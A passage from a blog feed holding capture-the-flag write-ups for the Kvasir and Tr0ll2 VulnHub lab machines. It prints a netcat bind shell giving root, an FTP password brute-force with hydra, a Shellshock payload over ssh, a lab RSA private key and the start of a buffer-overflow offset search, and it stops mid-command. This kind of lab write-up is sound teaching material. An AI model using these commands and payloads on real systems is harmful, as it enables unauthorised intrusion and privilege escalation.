+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">encrypted_message</span> <span class="n">XOR</span> <span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">message</span> <span class="n">XOR</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">flag</span> <span class="n">XOR</span> <span class="n">key</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">xor_both_result</span> <span class="o">=</span> <span class="n">xor_strings</span><span class="p">(</span><span class="n">binary_message</span><span class="p">,</span> <span class="n">binary_flag</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">XOR</span> <span class="n">above</span> <span class="n">rsult</span> <span class="k">with</span> <span class="n">plaintext</span> <span class="n">message</span> <span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span><span class="p">,</span> <span class="n">because</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">key</span> <span class="n">XOR</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="ow">and</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">message</span> <span class="n">XOR</span> <span class="n">message</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">therefore</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">message</span> <span class="n">XOR</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">flag</span> <span class="n">XOR</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">message</span> <span class="o">=</span> <span class="n">flag</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">decoded_flag</span> <span class="o">=</span> <span class="n">xor_strings</span><span class="p">(</span><span class="n">xor_both_result</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">decoded_flag</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Let&rsquo;s exploit it!</p>
+
+<pre><code>kefka@adm:~$ sudo /opt/wep2.py &amp;
+[1] 2824
+kefka@adm:~$ ./exp.py 
+0W6U6vwG4W1V
+</code></pre>
+
+<p>Wow, that was actually <em>really</em> quick (way less than 1s)&hellip; that&rsquo;s our plaintext flag! But is that it? We need a root shell! I tried using it as a root password, but didn&rsquo;t work. Tried few other things, tried to find other privilege escalation points, but no luck.</p>
+
+<p>Finally, I decided to put it in as input in the program we just exploited.</p>
+
+<pre><code>=============================
+Can you retrieve my secret..?
+=============================
+
+Usage:
+'V' to view the encrypted flag
+'E' to encrypt a plaintext string (e.g. 'E AAAA')
+
+0W6U6vwG4W1V
+&gt; ls
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+NameError: name 'ls' is not defined
+&gt; print "A"
+A
+</code></pre>
+
+<p>Python shell? Wow, ok, let&rsquo;s create real shell!</p>
+
+<pre><code>&gt; import os; os.system("nc -e /bin/sh -l -p 31337")
+^C
+kefka@adm:~$ nc localhost 31337
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+flag
+cat flag
+    _  __                             _            
+   | |/ /   __ __   __ _     ___     (_)      _ _  
+   | ' &lt;    \ I /  / _` |   (_-&lt;     | |     | '_| 
+   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
+  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+
+Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
+gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax 
+gur Zrnq bs Cbrgel...
+
+Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
+Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
+
+Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
+uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.
+
+  enfgn_zbhfr(@_EnfgnZbhfr)
+</code></pre>
+
+<p>Even the flag is messed up&hellip; ROT-13 :)</p>
+
+<pre><code>cat flag | tr 'n-za-mN-ZA-M' 'a-zA-Z'
+    _  __                             _            
+   | |/ /   __ __   __ _     ___     (_)      _ _  
+   | ' &lt;    \ V /  / _` |   (_-&lt;     | |     | '_| 
+   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
+  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+
+Congratulations on beating Kvasir - I hope you enjoyed
+the ride.  Take his blood, mix with honey and drink 
+the Mead of Poetry...
+
+Big shout out to my beta testers: @barrebas and @TheColonial.
+Special thanks to Bas for his patience during this endeavour.
+
+Feel free to ping me with thoughts/comments on
+http://wi-fu.co.uk, #VulnHub IRC or Twitter.
+
+  rasta_mouse(@_RastaMouse)
+</code></pre>
+
+<h2>Summary</h2>
+
+<p>Awesome challenge! Spent quite a lot of hours (on and off) working on it, I liked the multi-layered design of it and how it touched on quite a lot of aspects of security! Also I managed to brush up on some of the forensics skills and learnt something new about key reuse :) Great job building it up <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a>!</p>
+
+<p>Oh, also, obligatory network diagram of the whole thing.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/diagram.png" title="Diagram" alt="Diagram" /></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Beating the Troll - Tr0ll2 Writeup]]></title>
+    <link href="http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/"/>
+    <updated>2014-10-28T19:57:51+11:00</updated>
+    <id>http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup</id>
+    <content type="html"><![CDATA[<p>Damn, I love <a href="http://www.vulnhub.com">VulnHub</a> - always keeps me entertained! With so many VMs released recently and with me just coming off an awesome CTF I have been kept quite busy those last couple weeks! Keeping the momentum up, I decided to give <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2 VM</a> a shot. As expected, there were trolls on the way, but overall I quite enjoyed it! Alright, let&rsquo;s rock on.</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>As per usual, let&rsquo;s boot up the VM and find its IP address using <code>netdiscover</code>:</p>
+
+<pre><code>root@kali:~# netdiscover -r 172.16.246.0/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
+
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                                                                                               
+ 172.16.246.135  00:0c:29:68:a8:92    01    060   VMware, Inc.                                                                                               
+ 172.16.246.254  00:50:56:f7:73:6c    01    060   VMWare, Inc.                                                                                               
+</code></pre>
+
+<p>And <code>nmap</code> to see what services are exposed:</p>
+
+<pre><code>root@kali:~# nmap -sV 172.16.246.135
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-28 19:50 EST
+Nmap scan report for 172.16.246.135
+Host is up (0.00018s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+MAC Address: 00:0C:29:68:A8:92 (VMware)
+Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.28 seconds
+</code></pre>
+
+<p>As expected, webserver running on port 80. By the way, looking at software and versions nothing seems to be immediatelly exploitable and FTP server doesn&rsquo;t allow annonymous login.</p>
+
+<h2>Enumerating the web server</h2>
+
+<p>Let&rsquo;s have a look at the website.</p>
+
+<p><img src="/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/troll_main.png" alt="Troll" /></p>
+
+<p>First troll, many more to come! First thought - let&rsquo;s fire up <code>dirbuster</code> and see what it&rsquo;ll come up with. Unfortunately, it didn&rsquo;t come up with anything interesting at all.</p>
+
+<p>Let&rsquo;s check for <code>robots.txt</code> file.</p>
+
+<pre><code>User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop
+</code></pre>
+
+<p>Aha! Let&rsquo;s check is there anything interesting hiding there. I tried couple of the folders one by one, but it&rsquo;s gotten quite boring and repetitive, so I&rsquo;ve dumped all directories into <code>list.txt</code> file and crafted a very simple one-liner to do all the hard work for me :)</p>
+
+<p><code>``
+root@kali:~# for dir in</code>cat list.txt`; do echo &ldquo;&mdash;&mdash;- $dir &mdash;&mdash;-&rdquo;; curl <a href="http://172.16.246.135$dir;">http://172.16.246.135$dir;</a> done
+&mdash;&mdash;- /noob &mdash;&mdash;-
+&lt;!DOCTYPE HTML PUBLIC &ldquo;-//IETF//DTD HTML 2.0//EN&rdquo;>
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body></p>
+
+<h1>Moved Permanently</h1>
+
+
+<p>The document has moved <a href="http://172.16.246.135/noob/">here</a>.</p>
+
+
+<hr>
+
+
+<address>Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80</address>
+
+
+<p></body></html>
+&mdash;&mdash;- /nope &mdash;&mdash;-
+&lt;!DOCTYPE HTML PUBLIC &ldquo;-//IETF//DTD HTML 2.0//EN&rdquo;>
+<html><head>
+<title>404 Not Found</title>
+</head><body></p>
+
+<h1>Not Found</h1>
+
+
+<p>The requested URL /nope was not found on this server.</p>
+
+
+<hr>
+
+
+<address>Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80</address>
+
+
+<p></body></html>
+&mdash;&mdash;- /try_harder &mdash;&mdash;-
+&lt;!DOCTYPE HTML PUBLIC &ldquo;-//IETF//DTD HTML 2.0//EN&rdquo;>
+<html><head>
+<title>404 Not Found</title>
+</head><body></p>
+
+<h1>Not Found</h1>
+
+
+<p>The requested URL /try_harder was not found on this server.</p>
+
+
+<hr>
+
+
+<address>Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80</address>
+
+
+<p></body></html></p>
+
+<p>&hellip; (truncated) &hellip;</p>
+
+<pre><code>
+As you can see, quite a few of them resulted in ```404 Not Found``` and just a couple were invoking redirection to the same folder, but followed with ```/```. I have manually visited all of them (```/noob/```, ```/keep_trying/```, ```/dont_bother``` and ```/ok_this_is_it/```) and they all contained the same image:
+
+![Troll Kitty](/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/troll_kitty.jpg)
+
+I have saved each one of them for reference (looking at source code of the pages, they were all coming from different location, so the images could really be different).
+
+I have tried poking around a bit more and couldn't find anything else that seemed interesting, so I decided to look closer into the images, starting with the previously downloaded kitten ones. Let's run strings on them and see if something interesting comes up.
+</code></pre>
+
+<p>root@kali:~/Desktop# strings cat_the_troll_dont_bother.jpg
+JFIF</p>
+
+<h1>3-652-108?QE8&lt;M=01F`GMTV[[7DcjcXjQY[W</h1>
+
+<p>)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+&ldquo;aq2
+\vRH
+sdwTi</p>
+
+<p>&hellip; (truncated) &hellip;</p>
+
+<p>]=%em;
+lj\p
+*/ p?E$
+Look Deep within y0ur_self for the answer
+&#8220;`</p>
+
+<p>Ha! One from <code>/dont_bother/</code> contains a message! But what is it trying to tell us?</p>
+
+<p>&ldquo;look within y0ur_self&rdquo;? Hmmm, it could be another directory on the webserver?</p>
+
+<p><img src="/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/y0ur_self.png" alt="y0ur_self Dir" /></p>
+
+<p>Sure it is!</p>
+
+<h2>Dictionaries and cracking passwords</h2>
+
+<p>Let&rsquo;s see what the <code>answer.txt</code> file contains.</p>
+
+<pre><code>QQo=
+QQo=
+QUEK
+QUIK
+QUJNCg==
+QUMK
+QUNUSAo=
+QUkK
+QUlEUwo=
+QU0K
+QU9MCg==
+QU9MCg==
+QVNDSUkK
+QVNMCg==
+QVRNCg==
+QVRQCg==
+QVdPTAo=
+QVoK
+QVpUCg==
+QWFjaGVuCg==
+QWFsaXlhaAo=
+QWFsaXlhaAo=
+QWFyb24K
+QWJiYXMK
+QWJiYXNpZAo=
+QWJib3R0Cg==
+QWJib3R0Cg==
+QWJieQo=
+QWJieQo=
+QWJkdWwK
+QWJkdWwK
+
+... (truncated) ...
+</code></pre>
+
+<p>Looks like base64 encoded strings. Let&rsquo;s download the file and decode them all! Once again, simple one-liner will help us out:</p>
+
+<pre><code>root@kali:~/Desktop# for word in `cat answer.txt`; do echo $word | base64 -d; done &gt; answer-decoded.txt
+</code></pre>
+
+<p>It will take a while&hellip; after all it&rsquo;s a pretty big file. Once all done, we can see that it&rsquo;s some kind of a dictionary.</p>
+
+<pre><code>root@kali:~/Desktop# cat answer-decoded.txt 
+
+... (truncated) ...
+
+interpretative
+interpreted
+interpreter
+interpreter
+interpreters
+interpreting
+interpretive
+interprets
+interracial
+interred
+interrelate
+interrelated
+interrelates
+interrelating
+
+... (truncated) ...
+</code></pre>
+
+<p>And upon further googling and researching, I found out that it seems to be a dictionary shipped by default with Ubuntu.</p>
+
+<p>Fortunately I had Ubuntu installed and decided to grab its dictionary and compare it to the <code>answer-decoded.txt</code> file - knowing trolls, probably some new words were added that could be the clue!</p>
+
+<p>First difference I noticed was that all apostrophies were trimmed out from <code>answer-decoded.txt</code>. Let&rsquo;s do the same for Ubuntu dictionary using a nice <code>vim</code> trick to remove everything from <code>'</code> till the end of the line:</p>
+
+<pre><code>:%s/'[^$]*//g
+</code></pre>
+
+<p>Ok, this will result in some duplicates, so let&rsquo;s get rid of them on both files:</p>
+
+<pre><code>root@kali:~/Desktop# sort -u answer-decoded.txt &gt; answer-decoded-nodup.txt
+root@kali:~/Desktop# sort -u ubuntu-dict.txt &gt; ubuntu-dict-nodup.txt
+</code></pre>
+
+<p>And run <code>diff</code> on them:</p>
+
+<pre><code>root@kali:~/Desktop# diff ubuntu-dict-nodup.txt -u answer-decoded-nodup.txt &gt; diff.txt
+root@kali:~/Desktop# cat diff.txt
+--- ubuntu-dict-nodup.txt  2014-10-28 06:25:08.083151991 -0400
++++ answer-decoded-nodup.txt    2014-10-28 06:25:21.103151724 -0400
+@@ -2326,7 +2326,6 @@
+ angry
+ angst
+ angstrom
+-Ångström
+ angstroms
+
+... (truncated) ...
+
+@@ -34174,6 +34161,7 @@
+ italics
+ Italy
+ Itasca
++ItCantReallyBeThisEasyRightLOL
+ itch
+ itched
+ itches
+@@ -43524,6 +43512,7 @@
+ noon
+ noonday
+ noontime
++noooob_lol
+ noose
+ nooses
+ Nootka
+@@ -67180,6 +67169,7 @@
+ trolleys
+ trollies
+ trolling
++trollololol
+ trollop
+ Trollope
+ trollops
+</code></pre>
+
+<p>Awesome, so there are 3 strings that seem that were added to the original list:</p>
+
+<ul>
+<li>ItCantReallyBeThisEasyRightLOL</li>
+<li>noooob_lol</li>
+<li>trollololol</li>
+</ul>
+
+
+<p>We may be able to use them as passwords/usernames later.</p>
+
+<p>After more poking around, a cup of coffee and some frustration, I wasn&rsquo;t able to squeeze out anything interesting from the <code>answer.txt</code> file or the webserver, so I moved on to focus on FTP server.</p>
+
+<p>Having a list of <em>potential</em> usernames and passwords, I decided to perform dictionary attack on the FTP server using harvested data as below.</p>
+
+<p><em>Note: after numerous trials and errors, frustration and doubts, I decided to add more words to the dictionary</em></p>
+
+<pre><code>root@kali:~/Desktop# cat dict.txt 
+ItCantReallyBeThisEasyRightLOL
+noooob_lol
+trollololol
+noob
+nope
+try_harder
+keep_trying
+isnt_this_annoying
+nothing_here
+404
+LOL_at_the_last_one
+trolling_is_fun
+zomg_is_this_it
+you_found_me
+I_know_this_sucks
+You_could_give_up
+dont_bother
+will_it_ever_end
+I_hope_you_scripted_this
+ok_this_is_it
+stop_whining
+why_are_you_still_looking
+just_quit
+seriously_stop
+troll
+Tr0ll
+Tr0ll2
+Tr0ll:2
+Tr0llv2
+Maleus
+</code></pre>
+
+<p>Let&rsquo;s use <code>hydra</code> and see if we&rsquo;ll be able to crack the username:password combination with any of those.</p>
+
+<pre><code>root@kali:~/Desktop# hydra -t 30 -L dict.txt -P dict.txt 172.16.246.135 ftp -e nsr -f
+Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-28 21:42:16
+[DATA] 30 tasks, 1 server, 990 login tries (l:30/p:33), ~33 tries per task
+[DATA] attacking service ftp on port 21
+
+[STATUS] 620.00 tries/min, 620 tries in 00:01h, 370 todo in 00:01h, 30 active
+[21][ftp] host: 172.16.246.135   login: Tr0ll   password: Tr0ll
+[STATUS] attack finished for 172.16.246.135 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-28 21:43:38
+</code></pre>
+
+<p>HAAAAAAAAAAA! Let&rsquo;s log-in using Tr0ll:Tr0ll credentials.</p>
+
+<pre><code>root@kali:~/Desktop# ftp 172.16.246.135
+Connected to 172.16.246.135.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (172.16.246.135:root): Tr0ll
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -al
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Oct 04 01:24 .
+drwxr-xr-x    2 0        0            4096 Oct 04 01:24 ..
+-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
+226 Directory send OK.
+</code></pre>
+
+<p>Just one file, <code>lmao.zip</code>, let&rsquo;s get it.</p>
+
+<pre><code>ftp&gt; get lmao.zip
+local: lmao.zip remote: lmao.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+226 Transfer complete.
+1474 bytes received in 0.00 secs (2460.6 kB/s)
+ftp&gt; quit
+221 Goodbye.
+</code></pre>
+
+<p>And unzip:</p>
+
+<pre><code>root@kali:~/Desktop# unzip lmao.zip 
+Archive:  lmao.zip
+[lmao.zip] noob password: 
+</code></pre>
+
+<p>Password protected?! Ahhhhh&hellip; luckily, I had a good gut feel and got it at the first try - remember the string <code>ItCantReallyBeThisEasyRightLOL</code>? It did kinda look like password&hellip; well, it is! :)</p>
+
+<p>As a result, we get a <code>noob</code> file, which is an RSA private key!</p>
+
+<pre><code>root@kali:~/Desktop# cat noob 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<h2>Breaking into shell? Shock(ing)!</h2>
+
+<p>Sweet, let&rsquo;s use it to log-in via <code>ssh</code>. But what username should we use? Let&rsquo;s try <code>noob</code>.</p>
+
+<pre><code>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob 
+TRY HARDER LOL!
+Connection to 172.16.246.135 closed.
+</code></pre>
+
+<p>What the hell?! The connection is closed straight away. Okay, I know few workarounds for it&hellip; Let&rsquo;s try calling different shell at the log-in:</p>
+
+<pre><code>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "/bin/sh"
+TRY HARDER LOL!
+Connection to 172.16.246.135 closed.
+</code></pre>
+
+<p>Nope. How about starting shell without the &lsquo;rc&rsquo; profile:</p>
+
+<pre><code>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "bash --noprofile"
+TRY HARDER LOL!
+Connection to 172.16.246.135 closed.
+</code></pre>
+
+<p>Arrrghhh! It&rsquo;s getting annoying. What&rsquo;s other way I can bypass that&hellip;? And then it hit me - how could I forget about it (it kept me up at night for much longer than I would&rsquo;ve like), ladies and gentleman - SHELLSHOCK!</p>
+
+<pre><code>root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "() { :; }; /bin/bash"
+noob@Tr0ll2:~$ 
+</code></pre>
+
+<p>Sweeeeeeeet, we&rsquo;re in! :D</p>
+
+<h2>Exploiting buffer overflow</h2>
+
+<p>After a bit of a poking around we can quickly find an interesting folder with even more interesting files:</p>
+
+<pre><code>noob@Tr0ll2:~$ cd /nothing_to_see_here/choose_wisely/
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
+door1  door2  door3
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
+door1:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  4 22:19 .
+drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
+-rwsr-xr-x 1 root root 7271 Oct  4 22:19 r00t
+
+door2:
+total 20
+drwsr-xr-x 2 root root 4096 Oct  5 21:19 .
+drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
+-rwsr-xr-x 1 root root 8401 Oct  5 21:17 r00t
+
+door3:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  5 21:18 .
+drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
+-rwsr-xr-x 1 root root 7273 Oct  5 21:18 r00t
+</code></pre>
+
+<p>Three binaries owned by root with a &lsquo;sticky bit&rsquo; set! Seems like we should be able to get our privilege escalation through it.</p>
+
+<p>But that&rsquo;s where the trolls hit again, only one of these binaries is actually useful, other two are just trolling with you - one of them reboots the VM and the other puts you in a restricted shell for a limited period of time. The one of interest that we&rsquo;ll be exploiting is the biggest one. Also, it seems that periodically the binaries are shuffled around the directories (once it&rsquo;s <code>door1</code>, then maybe <code>door3</code> etc.), so make sure to always keep an eye on the size of the binary you&rsquo;re working on.</p>
+
+<p>Alright, let&rsquo;s get to the fun part! First, let&rsquo;s run the right binary and see what it does.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t 
+Usage: ./r00t input
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t AAAAAAAAAAAAAA
+AAAAAAAAAAAAAA
+</code></pre>
+
+<p>OK, it seems like it&rsquo;s just replaying the input. Let&rsquo;s pass in something big.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 400')
+Segmentation fault
+</code></pre>
+
+<p>Hahaaa! Hello seg-fault, I was expecting you. Let&rsquo;s find out can we overwrite return address and what&rsquo;s the offset.</p>
+
+<p>As always, best tool for the job - <code>pattern_create.rb</code> in metasploit tools.</p>
+
+<pre><code>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 400
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+</code></pre>
+
+<p>Conveniently <code>gdb</code> is installed on the host, so we can do our debugging in there. Let&rsquo;s find the offset!</p>
+
+<pre><code>(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
